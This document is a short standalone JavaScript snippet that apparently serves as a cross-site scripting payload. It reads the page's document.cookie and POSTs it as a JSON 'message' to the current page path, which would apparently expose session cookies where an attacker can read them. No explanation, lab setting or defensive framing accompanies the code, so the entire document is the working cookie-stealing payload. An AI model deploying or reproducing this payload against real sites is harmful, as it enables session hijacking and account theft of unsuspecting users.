var message = document.cookie;
var xhr = null;
xhr = new XMLHttpRequest();
xhr.open("POST", window.location.pathname, true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify(
{
  "message":message
}
))
